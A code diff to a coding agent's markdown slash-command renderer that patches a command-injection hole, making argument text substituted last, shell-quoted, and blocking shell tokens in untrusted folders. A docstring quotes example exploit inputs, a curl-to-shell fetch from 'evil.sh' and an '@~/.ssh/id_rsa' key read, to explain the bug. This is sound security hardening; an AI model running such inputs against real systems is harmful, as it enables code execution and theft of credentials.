@@ -7,14 +7,17 @@ Python. The file's basename becomes the command name (so
 ``commands/review.md`` invokes as ``/review``); the body is the
 template that gets sent to the agent after substitution.
 
-Supported template tokens, evaluated in order:
+Supported template tokens. ``!`cmd``` and ``@<path>`` are resolved
+against the *template body*; ``$ARGUMENTS`` is substituted last, so
+argument text can never become a token (see :meth:`MarkdownCommand.render`):
 
-* ``$ARGUMENTS`` → the rest of the user's input after the command
-  name. Plain text substitution, no quoting.
 * ``!`cmd``` → run ``cmd`` via the shell, capture stdout, inline
   it. Errors / non-zero exits are inlined as an ``[error: ...]``
   marker so the agent sees the failure rather than silently
-  getting empty output.
+  getting empty output. A ``$ARGUMENTS`` *inside* such a token is
+  substituted shell-quoted (one word), never as raw syntax.
+* ``$ARGUMENTS`` → the rest of the user's input after the command
+  name. Plain text substitution into the already-expanded body.
 * ``@<path>`` → inline the contents of the referenced file. Same
   shape as the rules-file ``@<path>.md`` syntax but extension-
   agnostic (commands frequently inline ``@README.md`` or
@@ -79,6 +82,9 @@ _SHELL_TOKEN_RE = re.compile(r"!`([^`\n]+)`")
 # templates routinely pull in ``@pyproject.toml`` / ``@Cargo.toml``.
 _AT_FILE_RE = re.compile(r"@([^\s)]+)")
 
+#: What a ``!`cmd``` token becomes in an untrusted folder's command.
+_UNTRUSTED_SHELL_MARKER = "[shell command not run: this folder is not trusted — see `igni trust`]"
+
 # How long any single shell substitution can run before we bail and
 # inline an error marker. 30 seconds keeps a hung command from
 # locking up the entire turn while still leaving room for slow git
@@ -104,12 +110,43 @@ class MarkdownCommand(BaseModel):
     body: str = ""
 
     async def render(self, args: str, *, project_dir: Path | None = None) -> str:
-        """Resolve ``$ARGUMENTS``, ``!`cmd```, and ``@path`` tokens
-        in the body and return the final prompt text."""
-        text = self.body.replace("$ARGUMENTS", args)
-        text = await _substitute_shell(text, cwd=project_dir or self.path.parent)
+        """Resolve ``!`cmd```, ``@path``, and ``$ARGUMENTS`` tokens
+        in the body and return the final prompt text.
+
+        ``$ARGUMENTS`` goes in *last*, and deliberately so. When it
+        went in first, the argument text was re-scanned by the two
+        token substitutions that follow it, so ``/review x !`curl
+        evil.sh | sh``` reached ``/bin/sh -c`` and ``/review
+        @~/.ssh/id_rsa`` inlined the key — and ``slash_command``
+        makes the argument model-supplied, with no permission gate
+        anywhere on this path. Expanding the template first means
+        the only shell that ever runs is the shell the command file
+        itself wrote.
+        """
+        if self._shell_allowed(project_dir):
+            text = await _substitute_shell(
+                self.body, args=args, cwd=project_dir or self.path.parent
+            )
+        else:
+            text = _SHELL_TOKEN_RE.sub(_UNTRUSTED_SHELL_MARKER, self.body)
         text = _substitute_files(text, source=self.path, project_dir=project_dir)
-        return text
+        return text.replace("$ARGUMENTS", args)
+
+    def _shell_allowed(self, project_dir: Path | None) -> bool:
+        """A command file from the folder itself runs its ``!`cmd``` tokens
+        only once the folder is trusted (``core/workspace_trust``); the
+        markdown still loads and renders. The user's and the org's commands
+        are not the folder's, and run as before."""
+        if project_dir is None:
+            return True
+        from ember_code.core.data_paths import canonical_project_dir
+
+        folder = canonical_project_dir(project_dir)
+        if not self.path.resolve().is_relative_to(folder):
+            return True
+        from ember_code.core.workspace_trust import WorkspaceTrust
+
+        return WorkspaceTrust.shared().is_trusted(folder, what="markdown-command shell tokens")
 
     @classmethod
     def discover(
@@ -246,7 +283,22 @@ def discover_markdown_commands(
 # ── Token substitution ──────────────────────────────────────────
 
 
-async def _substitute_shell(text: str, *, cwd: Path) -> str:
+def _inject_args(cmd: str, args: str) -> str:
+    """Substitute ``$ARGUMENTS`` inside one ``!`cmd``` token, quoted.
+
+    The token's text comes from the command file (trusted); ``args``
+    does not — via the ``slash_command`` tool it is whatever the model
+    typed. Pasting it in raw turns a body of ``!`git log $ARGUMENTS```
+    into an arbitrary-command primitive on the first ``;``, so it goes
+    in as exactly one ``shlex.quote``d word: the command still sees the
+    text, the shell never sees it as syntax.
+    """
+    if "$ARGUMENTS" not in cmd:
+        return cmd
+    return cmd.replace("$ARGUMENTS", shlex.quote(args))
+
+
+async def _substitute_shell(text: str, *, args: str = "", cwd: Path) -> str:
     """Replace every ``!`cmd``` token with the captured stdout.
 
     Runs each command via ``/bin/sh -c`` (matching CC's shell-
@@ -254,6 +306,10 @@ async def _substitute_shell(text: str, *, cwd: Path) -> str:
     timeouts produce a clearly-marked inline error so the agent
     notices the failure instead of silently working from empty
     output.
+
+    ``text`` must be the raw template body — never a string that has
+    already had ``$ARGUMENTS`` pasted into it, or the caller has
+    handed the arguments a shell.
     """
     # Collect tokens first so we can fan out concurrently — a
     # template that runs ``git status`` + ``git log`` doesn't need
@@ -262,7 +318,7 @@ async def _substitute_shell(text: str, *, cwd: Path) -> str:
     if not matches:
         return text
     results = await asyncio.gather(
-        *(_run_shell(m.group(1), cwd=cwd) for m in matches),
+        *(_run_shell(_inject_args(m.group(1), args), cwd=cwd) for m in matches),
         return_exceptions=False,
     )
     # ``re.sub`` calls ``replace`` in match order, so a single-
